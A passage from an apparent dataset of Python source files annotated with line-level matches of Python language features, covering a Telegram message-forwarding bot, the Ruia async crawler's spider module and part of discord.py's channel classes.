\u043a\u0430\u043d\u0430\u043b\u0430 {channel}\")\n            if not channel.channel_id:\n                await channel.fetch_id()\n            if not channel.forward_to_channel_id:\n                await channel.create_reserve_channel()\n            if not channel.last_message_id:\n                last_message = await client.get_messages(channel.channel_id)\n                channel.last_message_id = last_message[0].id\n                await channel.save()\n            await fetch_forward_messages(channel)\n        await asyncio.sleep(30.0)\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(init_db())\n    try:\n        loop.run_until_complete(main())\n    except KeyboardInterrupt:\n        logger.info(\"Exiting\")",
            "patterns": {
                "pep_468": [
                    [
                        54,
                        "client.iter_messages(**params)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        54,
                        65,
                        "async for",
                        "async for message in client.iter_messages(**params):\n        if (\n                message.text and\n                any(bad_word in message.text for bad_word in channel.blaklist_words.split(','))\n        ):\n            logger.warning(message.text)\n            logger.success(\"\u0424\u0438\u043b\u044c\u0442\u0440 \u0441\u0440\u0430\u0431\u043e\u0442\u0430\u043b\")\n            continue\n        logger.info(f\"\u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 {message.id} \u0432 \u043a\u0430\u043d\u0430\u043b-\u0434\u0443\u0431\u043b\u0435\u0440\")\n        await message.forward_to(channel.forward_to_channel_id)\n        last_message_id = message.id\n        new_messages_count += 1"
                    ],
                    [
                        73,
                        83,
                        "async for",
                        "async for channel in Channel.all():\n            logger.info(f\"\u0421\u043e\u0431\u0438\u0440\u0430\u0435\u043c \u0441 \u043a\u0430\u043d\u0430\u043b\u0430 {channel}\")\n            if not channel.channel_id:\n                await channel.fetch_id()\n            if not channel.forward_to_channel_id:\n                await channel.create_reserve_channel()\n            if not channel.last_message_id:\n                last_message = await client.get_messages(channel.channel_id)\n                channel.last_message_id = last_message[0].id\n                await channel.save()\n            await fetch_forward_messages(channel)"
                    ]
                ],
                "pep_498": [
                    [
                        23,
                        "        return f'Channel: {self.name}'"
                    ],
                    [
                        62,
                        "        logger.info(f\"\u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 {message.id} \u0432 \u043a\u0430\u043d\u0430\u043b-\u0434\u0443\u0431\u043b\u0435\u0440\")"
                    ],
                    [
                        67,
                        "        logger.success(f\"\u0421\u043e\u0431\u0440\u0430\u043d\u043e {new_messages_count} \u043d\u043e\u0432\u044b\u0445 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439\")"
                    ],
                    [
                        74,
                        "            logger.info(f\"\u0421\u043e\u0431\u0438\u0440\u0430\u0435\u043c \u0441 \u043a\u0430\u043d\u0430\u043b\u0430 {channel}\")"
                    ],
                    [
                        34,
                        "            functions.channels.CreateChannelRequest(title=f'AdBlocked {channel_title}', about=\"\")"
                    ]
                ]
            }
        },
        "52": {
            "file": "import asyncio\nimport collections\nimport typing\nfrom datetime import datetime\nfrom functools import reduce\nfrom inspect import isawaitable\nfrom signal import SIGINT, SIGTERM\nfrom types import AsyncGeneratorType\nfrom ruia.exceptions import InvalidCallbackResult, NotImplementedParseError, NothingMatchedError\nfrom ruia.item import Item\nfrom ruia.middleware import Middleware\nfrom ruia.request import Request\nfrom ruia.response import Response\nfrom ruia.utils import get_logger\ntry:\n    import uvloop\n    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\nexcept ImportError:\n    pass\nclass SpiderHook:\n    callback_result_map: dict = None\n    async def process_failed_response(self, request, response):\n        pass\n    async def process_succeed_response(self, request, response):\n        pass\n    async def process_item(self, item):\n        pass\n    async def process_callback_result(self, callback_result):\n        callback_result_name = type(callback_result).__name__\n        process_func_name = self.callback_result_map.get(callback_result_name, '')\n        process_func = getattr(self, process_func_name, None)\n        if process_func is not None:\n            await process_func(callback_result)\n        else:\n            raise InvalidCallbackResult(f'<Parse invalid callback result type: {callback_result_name}>')\nclass Spider(SpiderHook):\n    name = 'Ruia'\n    request_config = None\n    request_session = None\n    headers: dict = None\n    metadata: dict = None\n    kwargs: dict = None\n    failed_counts: int = 0\n    success_counts: int = 0\n    worker_numbers: int = 2\n    concurrency: int = 3\n    start_urls: list = None\n    worker_tasks: list = []\n    def __init__(self,\n                 middleware: typing.Union[typing.Iterable, Middleware] = None,\n                 loop=None,\n                 is_async_start: bool = False):\n        if not self.start_urls or not isinstance(self.start_urls, collections.Iterable):\n            raise ValueError(\n                \"Ruia spider must have a param named start_urls, eg: start_urls = ['https://www.github.com']\")\n        self.callback_result_map = self.callback_result_map or {}\n        self.request_config = self.request_config or {}\n        self.headers = self.headers or {}\n        self.metadata = self.metadata or {}\n        self.kwargs = self.kwargs or {}\n        self.request_config = self.request_config or {}\n        self.is_async_start = is_async_start\n        self.logger = get_logger(name='Spider')\n        self.loop = loop\n        asyncio.set_event_loop(self.loop)\n        if isinstance(middleware, list):\n            self.middleware = reduce(lambda x, y: x + y, middleware)\n        else:\n            self.middleware = middleware or Middleware()\n        self.request_queue = asyncio.Queue()\n        self.sem = asyncio.Semaphore(self.concurrency)\n    async def parse(self, response):\n        raise NotImplementedParseError('<!!! parse function is expected !!!>')\n    @classmethod\n    async def async_start(cls,\n                          middleware: typing.Union[typing.Iterable, Middleware] = None,\n                          loop=None,\n                          after_start=None,\n                          before_stop=None):\n        loop = loop or asyncio.get_event_loop()\n        spider_ins = cls(middleware=middleware, loop=loop, is_async_start=True)\n        await spider_ins._start(after_start=after_start, before_stop=before_stop)\n    @classmethod\n    def start(cls,\n              middleware: typing.Union[typing.Iterable, Middleware] = None,\n              loop=None,\n              after_start=None,\n              before_stop=None,\n              close_event_loop=True):\n        loop = loop or asyncio.new_event_loop()\n        spider_ins = cls(middleware=middleware, loop=loop)\n        for signal in (SIGINT, SIGTERM):\n            try:\n                spider_ins.loop.add_signal_handler(signal, lambda: asyncio.ensure_future(spider_ins.stop(signal)))\n            except NotImplementedError:\n                spider_ins.logger.warning(f'{spider_ins.name} tried to use loop.add_signal_handler '\n                                          'but it is not implemented on this platform.')\n        spider_ins.loop.run_until_complete(spider_ins._start(after_start=after_start, before_stop=before_stop))\n        spider_ins.loop.run_until_complete(spider_ins.loop.shutdown_asyncgens())\n        if close_event_loop:\n            spider_ins.loop.close()\n    async def handle_callback(self, aws_callback: typing.Coroutine, response):\n        callback_result = None\n        try:\n            callback_result = await aws_callback\n        except NothingMatchedError as e:\n            self.logger.error(f'<Item: {str(e).lower()}>')\n        except Exception as e:\n            self.logger.error(f'<Callback[{aws_callback.__name__}]: {e}')\n        return callback_result, response\n    async def handle_request(self, request: Request) -> typing.Tuple[AsyncGeneratorType, Response]:\n        callback_result, response = None, None\n        await self._run_request_middleware(request)\n        try:\n            callback_result, response = await request.fetch_callback(self.sem)\n        except NotImplementedParseError as e:\n            self.logger.error(e)\n        except NothingMatchedError as e:\n            self.logger.error(f'<Item: {str(e).lower()}>')\n        except Exception as e:\n            self.logger.error(f'<Callback[{request.callback.__name__}]: {e}')\n        await self._run_response_middleware(request, response)\n        await self._process_response(request=request, response=response)\n        return callback_result, response\n    async def multiple_request(self, urls, is_gather=False, **kwargs):\n        if is_gather:\n            resp_results = await asyncio.gather(\n                *[self.handle_request(self.request(url=url, **kwargs)) for url in urls],\n                return_exceptions=True)\n            for index, task_result in enumerate(resp_results):\n                if not isinstance(task_result, RuntimeError) and task_result:\n                    _, response = task_result\n                    response.index = index\n                    yield response\n        else:\n            for index, url in enumerate(urls):\n                _, response = await self.handle_request(self.request(url=url, **kwargs))\n                response.index = index\n                yield response\n    def request(self, url: str, method: str = 'GET', *,\n                callback=None,\n                encoding: typing.Optional[str] = None,\n                headers: dict = None,\n                metadata: dict = None,\n                request_config: dict = None,\n                request_session=None,\n                **kwargs):\n        headers = headers or {}\n        metadata = metadata or {}\n        request_config = request_config or {}\n        request_session = request_session or self.request_session\n        headers.update(self.headers.copy())\n        request_config.update(self.request_config.copy())\n        kwargs.update(self.kwargs.copy())\n        return Request(url=url,\n                       method=method,\n                       callback=callback,\n                       encoding=encoding,\n                       headers=headers,\n                       metadata=metadata,\n                       request_config=request_config,\n                       request_session=request_session,\n                       **kwargs)\n    async def start_master(self):\n        for url in self.start_urls:\n            request_ins = self.request(url=url, callback=self.parse, metadata=self.metadata)\n            self.request_queue.put_nowait(self.handle_request(request_ins))\n        workers = [asyncio.ensure_future(self.start_worker()) for i in range(self.worker_numbers)]\n        for worker in workers:\n            self.logger.info(f\"Worker started: {id(worker)}\")\n        await self.request_queue.join()\n        if not self.is_async_start:\n            await self.stop(SIGINT)\n    async def start_worker(self):\n        while True:\n            request_item = await self.request_queue.get()\n            self.worker_tasks.append(request_item)\n            if self.request_queue.empty():\n                results = await asyncio.gather(*self.worker_tasks, return_exceptions=True)\n                for task_result in results:\n                    if not isinstance(task_result, RuntimeError) and task_result:\n                        callback_results, response = task_result\n                        if isinstance(callback_results, AsyncGeneratorType):\n                            await self._process_async_callback(callback_results, response)\n                self.worker_tasks = []\n            self.request_queue.task_done()\n    async def stop(self, _signal):\n        self.logger.info(f'Stopping spider: {self.name}')\n        tasks = [task for task in asyncio.Task.all_tasks() if task is not\n                 asyncio.tasks.Task.current_task()]\n        [task.cancel() for task in tasks]\n        await asyncio.gather(*tasks, return_exceptions=True)\n        self.loop.stop()\n    async def _process_async_callback(self, callback_results: AsyncGeneratorType, response: Response = None):\n        try:\n            async for callback_result in callback_results:\n                if isinstance(callback_result, AsyncGeneratorType):\n                    await self._process_async_callback(callback_result)\n                elif isinstance(callback_result, Request):\n                    self.request_queue.put_nowait(self.handle_request(request=callback_result))\n                elif isinstance(callback_result, typing.Coroutine):\n                    self.request_queue.put_nowait(self.handle_callback(aws_callback=callback_result, response=response))\n                elif isinstance(callback_result, Item):\n                    await self.process_item(callback_result)\n                else:\n                    await self.process_callback_result(callback_result=callback_result)\n        except Exception as e:\n            self.logger.error(e)\n    async def _process_response(self, request: Request, response: Response):\n        if response:\n            if response.ok:\n                self.success_counts += 1\n                await self.process_succeed_response(request, response)\n            else:\n                self.failed_counts += 1\n                await self.process_failed_response(request, response)\n    async def _run_request_middleware(self, request: Request):\n        if self.middleware.request_middleware:\n            for middleware in self.middleware.request_middleware:\n                try:\n                    await middleware(request)\n                except TypeError:\n                    self.logger.error(f\"<Middleware {middleware.__name__}: must be a coroutine function\")\n                except Exception as e:\n                    self.logger.error(f'<Middleware {middleware.__name__}: {e}')\n    async def _run_response_middleware(self, request: Request, response: Response):\n        if self.middleware.response_middleware:\n            for middleware in self.middleware.response_middleware:\n                try:\n                    await middleware(request, response)\n                except TypeError:\n                    self.logger.error(f\"<Middleware {middleware.__name__}: must be a coroutine function\")\n                except Exception as e:\n                    self.logger.error(f'<Middleware {middleware.__name__}: {e}')\n    async def _run_spider_hook(self, hook_func):\n        if callable(hook_func):\n            try:\n                aws_hook_func = hook_func(self)\n                if isawaitable(aws_hook_func):\n                    await aws_hook_func\n            except Exception as e:\n                self.logger.error(f'<Hook {hook_func.__name__}: {e}')\n    async def _start(self, after_start=None, before_stop=None):\n        self.logger.info('Spider started!')\n        start_time = datetime.now()\n        await self._run_spider_hook(after_start)\n        try:\n            await self.start_master()\n        finally:\n            await self._run_spider_hook(before_stop)\n            end_time = datetime.now()\n            self.logger.info(f'Total requests: {self.failed_counts + self.success_counts}')\n            if self.failed_counts:\n                self.logger.info(f'Failed requests: {self.failed_counts}')\n            self.logger.info(f'Time usage: {end_time - start_time}')\n            self.logger.info('Spider finished!')",
            "patterns": {
                "pep_468": [
                    [
                        128,
                        "self.request(url=url, **kwargs)"
                    ],
                    [
                        137,
                        "self.request(url=url, **kwargs)"
                    ],
                    [
                        155,
                        "Request(url=url,\n                       method=method,\n                       callback=callback,\n                       encoding=encoding,\n                       headers=headers,\n                       metadata=metadata,\n                       request_config=request_config,\n                       request_session=request_session,\n                       **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        21,
                        "callback_result_map: dict = None"
                    ],
                    [
                        40,
                        "headers: dict = None"
                    ],
                    [
                        41,
                        "metadata: dict = None"
                    ],
                    [
                        42,
                        "kwargs: dict = None"
                    ],
                    [
                        43,
                        "failed_counts: int = 0"
                    ],
                    [
                        44,
                        "success_counts: int = 0"
                    ],
                    [
                        45,
                        "worker_numbers: int = 2"
                    ],
                    [
                        46,
                        "concurrency: int = 3"
                    ],
                    [
                        47,
                        "start_urls: list = None"
                    ],
                    [
                        48,
                        "worker_tasks: list = []"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        125,
                        139,
                        "async generator",
                        "async def multiple_request(self, urls, is_gather=False, **kwargs):\n        if is_gather:\n            resp_results = await asyncio.gather(\n                *[self.handle_request(self.request(url=url, **kwargs)) for url in urls],\n                return_exceptions=True)\n            for index, task_result in enumerate(resp_results):\n                if not isinstance(task_result, RuntimeError) and task_result:\n                    _, response = task_result\n                    response.index = index\n                    yield response\n        else:\n            for index, url in enumerate(urls):\n                _, response = await self.handle_request(self.request(url=url, **kwargs))\n                response.index = index\n                yield response"
                    ],
                    [
                        196,
                        206,
                        "async for",
                        "async for callback_result in callback_results:\n                if isinstance(callback_result, AsyncGeneratorType):\n                    await self._process_async_callback(callback_result)\n                elif isinstance(callback_result, Request):\n                    self.request_queue.put_nowait(self.handle_request(request=callback_result))\n                elif isinstance(callback_result, typing.Coroutine):\n                    self.request_queue.put_nowait(self.handle_callback(aws_callback=callback_result, response=response))\n                elif isinstance(callback_result, Item):\n                    await self.process_item(callback_result)\n                else:\n                    await self.process_callback_result(callback_result=callback_result)"
                    ]
                ],
                "pep_498": [
                    [
                        188,
                        "        self.logger.info(f'Stopping spider: {self.name}')"
                    ],
                    [
                        35,
                        "            raise InvalidCallbackResult(f'<Parse invalid callback result type: {callback_result_name}>')"
                    ],
                    [
                        170,
                        "            self.logger.info(f\"Worker started: {id(worker)}\")"
                    ],
                    [
                        252,
                        "            self.logger.info(f'Total requests: {self.failed_counts + self.success_counts}')"
                    ],
                    [
                        255,
                        "            self.logger.info(f'Time usage: {end_time - start_time}')"
                    ],
                    [
                        107,
                        "            self.logger.error(f'<Item: {str(e).lower()}>')"
                    ],
                    [
                        109,
                        "            self.logger.error(f'<Callback[{aws_callback.__name__}]: {e}')"
                    ],
                    [
                        119,
                        "            self.logger.error(f'<Item: {str(e).lower()}>')"
                    ],
                    [
                        121,
                        "            self.logger.error(f'<Callback[{request.callback.__name__}]: {e}')"
                    ],
                    [
                        254,
                        "                self.logger.info(f'Failed requests: {self.failed_counts}')"
                    ],
                    [
                        96,
                        "                spider_ins.logger.warning(f'{spider_ins.name} tried to use loop.add_signal_handler '"
                    ],
                    [
                        242,
                        "                self.logger.error(f'<Hook {hook_func.__name__}: {e}')"
                    ],
                    [
                        223,
                        "                    self.logger.error(f\"<Middleware {middleware.__name__}: must be a coroutine function\")"
                    ],
                    [
                        225,
                        "                    self.logger.error(f'<Middleware {middleware.__name__}: {e}')"
                    ],
                    [
                        232,
                        "                    self.logger.error(f\"<Middleware {middleware.__name__}: must be a coroutine function\")"
                    ],
                    [
                        234,
                        "                    self.logger.error(f'<Middleware {middleware.__name__}: {e}')"
                    ]
                ]
            }
        },
        "53": {
            "file": "from __future__ import annotations\nimport time\nimport asyncio\nfrom typing import Any, Callable, Dict, Iterable, List, Mapping, Optional, TYPE_CHECKING, Tuple, Type, TypeVar, Union, overload\nimport datetime\nimport discord.abc\nfrom .permissions import PermissionOverwrite, Permissions\nfrom .enums import ChannelType, StagePrivacyLevel, try_enum, VoiceRegion, VideoQualityMode\nfrom .mixins import Hashable\nfrom . import utils\nfrom .utils import MISSING\nfrom .asset import Asset\nfrom .errors import ClientException, InvalidArgument\nfrom .stage_instance import StageInstance\nfrom .threads import Thread\nfrom .iterators import ArchivedThreadIterator\n__all__ = (\n    'TextChannel',\n    'VoiceChannel',\n    'StageChannel',\n    'DMChannel',\n    'CategoryChannel',\n    'StoreChannel',\n    'GroupChannel',\n)\nif TYPE_CHECKING:\n    from .types.threads import ThreadArchiveDuration\n    from .role import Role\n    from .member import Member, VoiceState\n    from .abc import Snowflake, SnowflakeTime\n    from .message import Message, PartialMessage\n    from .webhook import Webhook\n    from .state import ConnectionState\n    from .user import ClientUser, User, BaseUser\n    from .guild import Guild, GuildChannel as GuildChannelType\n    from .types.channel import (\n        TextChannel as TextChannelPayload,\n        VoiceChannel as VoiceChannelPayload,\n        StageChannel as StageChannelPayload,\n        DMChannel as DMChannelPayload,\n        CategoryChannel as CategoryChannelPayload,\n        StoreChannel as StoreChannelPayload,\n        GroupDMChannel as GroupChannelPayload,\n    )\nasync def _single_delete_strategy(messages: Iterable[Message]):\n    for m in messages:\n        await m.delete()\nclass TextChannel(discord.abc.Messageable, discord.abc.GuildChannel, Hashable):\n    __slots__ = (\n        'name',\n        'id',\n        'guild',\n        'topic',\n        '_state',\n        'nsfw',\n        'category_id',\n        'position',\n        'slowmode_delay',\n        '_overwrites',\n        '_type',\n        'last_message_id',\n    )\n    def __init__(self, *, state: ConnectionState, guild: Guild, data: TextChannelPayload):\n        self._state: ConnectionState = state\n        self.id: int = int(data['id'])\n        self._type: int = data['type']\n        self._update(guild, data)\n    def __repr__(self) -> str:\n        attrs = [\n            ('id', self.id),\n            ('name', self.name),\n            ('position', self.position),\n            ('nsfw', self.nsfw),\n            ('news', self.is_news()),\n            ('category_id', self.category_id),\n        ]\n        joined = ' '.join('%s=%r' % t for t in attrs)\n        return f'<{self.__class__.__name__} {joined}>'\n    def _update(self, guild: Guild, data: TextChannelPayload) -> None:\n        self.guild: Guild = guild\n        self.name: str = data['name']\n        self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')\n        self.topic: Optional[str] = data.get('topic')\n        self.position: int = data['position']\n        self.nsfw: bool = data.get('nsfw', False)\n        self.slowmode_delay: int = data.get('rate_limit_per_user', 0)\n        self._type: int = data.get('type', self._type)\n        self.last_message_id: Optional[int] = utils._get_as_snowflake(data, 'last_message_id')\n        self._fill_overwrites(data)\n    async def _get_channel(self):\n        return self\n    @property\n    def type(self) -> ChannelType:\n        return try_enum(ChannelType, self._type)\n    @property\n    def _sorting_bucket(self) -> int:\n        return ChannelType.text.value\n    @utils.copy_doc(discord.abc.GuildChannel.permissions_for)\n    def permissions_for(self, obj: Union[Member, Role], /) -> Permissions:\n        base = super().permissions_for(obj)\n        denied = Permissions.voice()\n        base.value &= ~denied.value\n        return base\n    @property\n    def members(self) -> List[Member]:\n        return [m for m in self.guild.members if self.permissions_for(m).read_messages]\n    @property\n    def threads(self) -> List[Thread]:\n        return [thread for thread in self.guild.threads if thread.parent_id == self.id]\n    def is_nsfw(self) -> bool:\n        return self.nsfw\n    def is_news(self) -> bool:\n        return self._type == ChannelType.news.value\n    @property\n    def last_message(self) -> Optional[Message]:\n        return self._state._get_message(self.last_message_id) if self.last_message_id else None\n    @overload\n    async def edit(\n        self,\n        *,\n        reason: Optional[str] = ...,\n        name: str = ...,\n        topic: str = ...,\n        position: int = ...,\n        nsfw: bool = ...,\n        sync_permissions: bool = ...,\n        category: Optional[CategoryChannel] = ...,\n        slowmode_delay: int = ...,\n        type: ChannelType = ...,\n        overwrites: Mapping[Union[Role, Member, Snowflake], PermissionOverwrite] = ...,\n    ) -> None:\n        ...\n    @overload\n    async def edit(self) -> None:\n        ...\n    async def edit(self, *, reason=None, **options):\n        await self._edit(options, reason=reason)\n    @utils.copy_doc(discord.abc.GuildChannel.clone)\n    async def clone(self, *, name: Optional[str] = None, reason: Optional[str] = None) -> TextChannel:\n        return await self._clone_impl(\n            {'topic': self.topic, 'nsfw': self.nsfw, 'rate_limit_per_user': self.slowmode_delay}, name=name, reason=reason\n        )\n    async def delete_messages(self, messages: Iterable[Snowflake]) -> None:\n        if not isinstance(messages, (list, tuple)):\n            messages = list(messages)\n        if len(messages) == 0:\n            return  \n        if len(messages) == 1:\n            message_id: int = messages[0].id\n            await self._state.http.delete_message(self.id, message_id)\n            return\n        if len(messages) > 100:\n            raise ClientException('Can only bulk delete messages up to 100 messages')\n        message_ids: List[int] = [m.id for m in messages]\n        await self._state.http.delete_messages(self.id, message_ids)\n    async def purge(\n        self,\n        *,\n        limit: Optional[int] = 100,\n        check: Callable[[Message], bool] = MISSING,\n        before: Optional[SnowflakeTime] = None,\n        after: Optional[SnowflakeTime] = None,\n        around: Optional[SnowflakeTime] = None,\n        oldest_first: Optional[bool] = False,\n        bulk: bool = True,\n    ) -> List[Message]:\n        if check is MISSING:\n            check = lambda m: True\n        iterator = self.history(limit=limit, before=before, after=after, oldest_first=oldest_first, around=around)\n        ret: List[Message] = []\n        count = 0\n        minimum_time = int((time.time() - 14 * 24 * 60 * 60) * 1000.0 - 1420070400000) << 22\n        strategy = self.delete_messages if bulk else _single_delete_strategy\n        async for message in iterator:\n            if count == 100:\n                to_delete = ret[-100:]\n                await strategy(to_delete)\n                count = 0\n                await asyncio.sleep(1)\n            if not check(message):\n                continue\n            if message.id < minimum_time:\n                if count == 1:\n                    await ret[-1].delete()\n                elif count >= 2:\n                    to_delete = ret[-count:]\n                    await strategy(to_delete)\n                count = 0\n                strategy = _single_delete_strategy\n            count += 1\n            ret.append(message)\n        if count >= 2:\n            to_delete = ret[-count:]\n            await strategy(to_delete)\n        elif count == 1:\n            await ret[-1].delete()\n        return ret\n    async def webhooks(self) -> List[Webhook]:\n        from .webhook import Webhook\n        data = await self._state.http.channel_webhooks(self.id)\n        return [Webhook.from_state(d, state=self._state) for d in data]\n    async def create_webhook(self, *, name: str, avatar: Optional[bytes] = None, reason: Optional[str] = None) -> Webhook:\n        from .webhook import Webhook\n        if avatar is not None:\n            avatar = utils._bytes_to_base64_data(avatar)  \n        data = await self._state.http.create_webhook(self.id, name=str(name), avatar=avatar, reason=reason)\n        return Webhook.from_state(data, state=self._state)\n    async def follow(self, *, destination: TextChannel, reason: Optional[str] = None) -> Webhook:\n        if not self.is_news():\n            raise ClientException('The channel must be a news channel.')\n        if not isinstance(destination, TextChannel):\n            raise InvalidArgument(f'Expected TextChannel received {destination.__class__.__name__}')\n        from .webhook import Webhook\n        data = await self._state.http.follow_webhook(self.id, webhook_channel_id=destination.id, reason=reason)\n        return Webhook._as_follower(data, channel=destination, user=self._state.user)\n    def get_partial_message(self, message_id: int, /) -> PartialMessage:\n        from .message import PartialMessage\n        return PartialMessage(channel=self, id=message_id)\n    def get_thread(self, thread_id: int, /) -> Optional[Thread]:\n        return self.guild.get_thread(thread_id)\n    async def start_thread(\n        self,\n        *,\n        name: str,\n        message: Optional[Snowflake] = None,\n        auto_archive_duration: ThreadArchiveDuration = 1440,\n        type: Optional[ChannelType] = None,\n        reason: Optional[str] = None\n    ) -> Thread:\n        if type is None:\n            type = ChannelType.private_thread\n        if message is None:\n            data = await self._state.http.start_thread_without_message(\n                self.id,\n                name=name,\n                auto_archive_duration=auto_archive_duration,\n                type=type.value,\n                reason=reason,\n            )\n        else:\n            data = await self._state.http.start_thread_with_message(\n                self.id,\n                message.id,\n                name=name,\n                auto_archive_duration=auto_archive_duration,\n                reason=reason,\n            )\n        return Thread(guild=self.guild, state=self._state, data=data)\n    def archived_threads(\n        self,\n        *,\n        private: bool = False,\n        joined: bool = False,\n        limit: Optional[int] = 50,\n        before: Optional[Union[Snowflake, datetime.datetime]] = None,\n    ) -> ArchivedThreadIterator:\n        return ArchivedThreadIterator(self.id, self.guild, limit=limit, joined=joined, private=private, before=before)\n    async def active_threads(self) -> List[Thread]:\n        data = await self._state.http.get_active_threads(self.id)\n        return [Thread(guild=self.guild, state=self._state, data=d) for d in data.get('threads', [])]\nclass VocalGuildChannel(discord.abc.Connectable, discord.abc.GuildChannel, Hashable):\n    __slots__ = (\n        'name',\n        'id',\n        'guild',\n        'bitrate',\n        'user_limit',\n        '_state',\n        'position',\n        '_overwrites',\n        'category_id',\n        'rtc_region',\n        'video_quality_mode',\n    )\n    def __init__(self, *, state: ConnectionState, guild: Guild, data: Union[VoiceChannelPayload, StageChannelPayload]):\n        self._state: ConnectionState = state\n        self.id: int = int(data['id'])\n        self._update(guild, data)\n    def _get_voice_client_key(self) -> Tuple[int, str]:\n        return self.guild.id, 'guild_id'\n    def _get_voice_state_pair(self) -> Tuple[int, int]:\n        return self.guild.id, self.id\n    def _update(self, guild: Guild, data: Union[VoiceChannelPayload, StageChannelPayload]) -> None:\n        self.guild = guild\n        self.name: str = data['name']\n        rtc = data.get('rtc_region')\n        self.rtc_region: Optional[VoiceRegion] = try_enum(VoiceRegion, rtc) if rtc is not None else None\n        self.video_quality_mode: VideoQualityMode = try_enum(VideoQualityMode, data.get('video_quality_mode', 1))\n        self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')\n        self.position: int = data['position']\n        self.bitrate: int = data.get('bitrate')\n        self.user_limit: int = data.get('user_limit')\n        self._fill_overwrites(data)\n    @property\n    def _sorting_bucket(self) -> int:\n        return ChannelType.voice.value\n    @property\n    def members(self) -> List[Member]:\n        ret = []\n        for user_id, state in self.guild._voice_states.items():\n            if state.channel and state.channel.id == self.id:\n                member = self.guild.get_member(user_id)\n                if member is not None:\n                    ret.append(member)\n        return ret\n    @property\n    def voice_states(self) -> Dict[int, VoiceState]:\n        return {\n            key: value\n            for key, value in self.guild._voice_states.items()\n            if value.channel and value.channel.id == self.id\n        }\n    @utils.copy_doc(discord.abc.GuildChannel.permissions_for)\n    def permissions_for(self, obj: Union[Member, Role], /) -> Permissions:\n        base = super().permissions_for(obj)\n        if not base.connect:\n            denied = Permissions.voice()\n            denied.update(manage_channels=True, manage_roles=True)\n            base.value &= ~denied.value\n        return base\nclass VoiceChannel(VocalGuildChannel):\n    __slots__ = ()\n    def __repr__(self) -> str:\n        attrs = [\n            ('id', self.id),\n            ('name', self.name),\n            ('rtc_region', self.rtc_region),\n            ('position', self.position),\n            ('bitrate', self.bitrate),\n            ('video_quality_mode', self.video_quality_mode),\n            ('user_limit', self.user_limit),\n            ('category_id', self.category_id),\n        ]\n        joined = ' '.join('%s=%r' % t for t in attrs)\n        return f'<{self.__class__.__name__} {joined}>'\n    @property\n    def type(self) -> ChannelType:\n        return ChannelType.voice\n    @utils.copy_doc(discord.abc.GuildChannel.clone)\n    async def clone(self, *, name: Optional[str] = None, reason: Optional[str] = None) -> VoiceChannel:\n        return await self._clone_impl({'bitrate': self.bitrate, 'user_limit': self.user_limit}, name=name, reason=reason)\n    @overload\n    async def edit(\n        self,\n        *,\n        name: str = ...,\n        bitrate: int = ...,\n        user_limit: int = ...,\n        position: int = ...,\n        sync_permissions: int = ...,\n        category: Optional[CategoryChannel] = ...,\n        overwrites: Mapping[Union[Role, Member], PermissionOverwrite] = ...,\n        rtc_region: Optional[VoiceRegion] = ...,\n        video_quality_mode: VideoQualityMode = ...,\n        reason: Optional[str] = ...,\n    ) -> None:\n        ...\n    @overload\n    async def edit(self) -> None:\n        ...\n    async def edit(self, *, reason=None, **options):\n        await self._edit(options, reason=reason)\nclass StageChannel(VocalGuildChannel):\n    __slots__ = ('topic',)\n    def __repr__(self) -> str:\n        attrs = [\n            ('id', self.id),\n            ('name', self.name),\n            ('topic', self.topic),\n            ('rtc_region', self.rtc_region),\n            ('position', self.position),\n            ('bitrate', self.bitrate),\n            ('video_quality_mode', self.video_quality_mode),\n            ('user_limit', self.user_limit),\n            ('category_id', self.category_id),\n        ]\n        joined = ' '.join('%s=%r' % t for t in attrs)\n        return f'<{self.__class__.__name__} {joined}>'\n    def _update(self, guild: Guild, data: StageChannelPayload) -> None:\n        super()._update(guild, data)\n        self.topic = data.get('topic')\n    @property\n    def requesting_to_speak(self) -> List[Member]:\n        return [member for member in self.members if member.voice and member.voice.requested_to_speak_at is not None]\n    @property\n    def speakers(self) -> List[Member]:\n        return [\n            member\n            for member in self.members\n            if member.voice and not member.voice.suppress and member.voice.requested_to_speak_at is None\n        ]\n    @property\n    def listeners(self) -> List[Member]:\n        return [member for member in self.members if member.voice and member.voice.suppress]\n    @property\n    def moderators(self) -> List[Member]:\n        required_permissions = Permissions.stage_moderator()\n        return [member for member in self.members if self.permissions_for(member) >= required_permissions]\n    @property\n    def type(self) -> ChannelType:\n        return ChannelType.stage_voice\n    @utils.copy_doc(discord.abc.GuildChannel.clone)\n    async def clone(self, *, name: Optional[str] = None, reason: Optional[str] = None) -> StageChannel:\n        return await self._clone_impl({}, name=name, reason=reason)\n    @property\n    def instance(self) -> Optional[StageInstance]:\n        return utils.get(self.guild.stage_instances, channel_id=self.id)\n    async def create_instance(self, *, topic: str, privacy_level: StagePrivacyLevel = MISSING, reason: Optional[str] = None) -> StageInstance:\n        payload: Dict[str, Any] = {'channel_id': self.id, 'topic': topic}\n        if privacy_level is not MISSING:\n            if not isinstance(privacy_level, StagePrivacyLevel):\n                raise InvalidArgument('privacy_level field must be of type PrivacyLevel')\n            payload['privacy_level'] = privacy_level.value\n        data = await self._state.http.create_stage_instance(**payload, reason=reason)\n        return StageInstance(guild=self.guild, state=self._state, data=data)\n    async def fetch_instance(self) -> StageInstance:\n        data = await self._state.http.get_stage_instance(self.id)\n        return StageInstance(guild=self.guild, state=self._state, data=data)\n    @overload\n    async def edit(\n        self,\n        *,\n        name: str = ...,\n        topic: Optional[str] = ...,\n        position: int = ...,\n        sync_permissions: int = ...,\n        category: Optional[CategoryChannel] = ...,\n        overwrites: Mapping[Union[Role, Member], PermissionOverwrite] = ...,\n        rtc_region: Optional[VoiceRegion] = ...,\n        video_quality_mode: VideoQualityMode = ...,\n        reason: Optional[str] = ...,\n    ) -> None:\n        ...\n    